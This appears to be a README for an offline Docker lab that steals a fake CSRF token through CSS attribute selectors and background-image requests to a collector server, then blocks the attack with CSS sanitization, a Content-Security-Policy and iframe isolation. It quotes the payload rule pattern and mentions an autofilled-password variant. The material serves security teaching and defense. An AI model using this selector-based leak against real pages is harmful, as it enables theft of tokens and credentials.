# Stealing a CSRF token with CSS — no JavaScript required

An untrusted email that carries only CSS can still read a secret out of the
page it is rendered in. CSS attribute selectors match the secret one prefix
at a time, and a `background-image` URL ships each matched character to an
attacker — no `<script>` tag involved. This lab steals a seeded fake CSRF
token character by character, then blocks the identical attack with three
layers of defense.

## Prerequisites

Docker + Docker Compose v2. Nothing else — everything runs in containers,
fully offline.

## Run it

```bash
docker compose build
docker compose up --abort-on-container-exit --exit-code-from driver
```

## What you should see

- The vulnerable run reconstructs the token: `Vulnerable run recovered: a1b2c3d4`.
- The hardened run recovers nothing and the collector logs zero requests:
  `Hardened run recovered  : (nothing)`, `Hardened run leak count : 0`.
- A final `PASS: token stolen without JavaScript, then fully blocked.` and
  compose exits `0`.

## How it works

Four services, wired together by `docker-compose.yml`:

- **webmail** (run twice, as `webmail-vuln` and `webmail-secure`) — a mail
  client that renders one attacker-controlled email. The email body is pure
  CSS; the page also contains a hidden element holding the secret token.
- **collector** — the attacker's server. It receives `background-image`
  requests and records which character was embedded in the request URL.
- **driver** — a headless browser that plays both attacker and victim. For
  each position in the token, it uploads a round of CSS built from an
  attribute-selector per candidate character, opens the message, and asks
  the collector which character (if any) just arrived.

The attack works prefix by prefix: round *N* contains one CSS rule per
character in the alphabet, each shaped like
`[data-token^="<known-prefix><candidate>"] { background-image: url(.../leak?...) }`.
Only the rule whose selector matches the real token value fires, so exactly
one `background-image` request reaches the collector — revealing the next
character. Repeat once per position and the whole token falls out, without a
single line of JavaScript running in the victim's browser.

Setting `SECURE=1` turns on three independent defenses, and the hardened run
leaks nothing because any one of them would be enough on its own:

1. **Sanitize the CSS.** The server strips `url(...)` and `@import` out of
   the untrusted email CSS before rendering it, so there's no
   attacker-controlled network request left to fire.
2. **Content-Security-Policy.** The response sends `img-src 'self'`, so even
   an unsanitized `url(...)` pointing at the collector would be blocked by
   the browser.
3. **DOM isolation.** The untrusted email is rendered inside a sandboxed
   `<iframe>` that never receives the secret token in the first place — the
   attacker's CSS has nothing sensitive in scope to select against.

The token, alphabet, and length are deliberately shrunk (8 hex characters
instead of a real CSRF token) so the demo finishes in seconds; a real attack
against a longer secret uses the exact same technique, just more rounds.

Two close relatives of this technique aren't implemented here, but are worth
knowing about: leaking via `@import` instead of `background-image` (same
idea, a different CSS primitive for triggering the request), and targeting
an autofilled password field instead of a hidden token (same selector
trick, applied to `input[value^=...]` with a browser that autofills
credentials into the DOM).

## Clean up

```bash
docker compose down -v
```

## Safety note

Everything here runs locally and offline — no request ever leaves your
machine. The only "secret" involved is an obviously-fake token seeded into
the lab (`a1b2c3d4`), not a real credential.
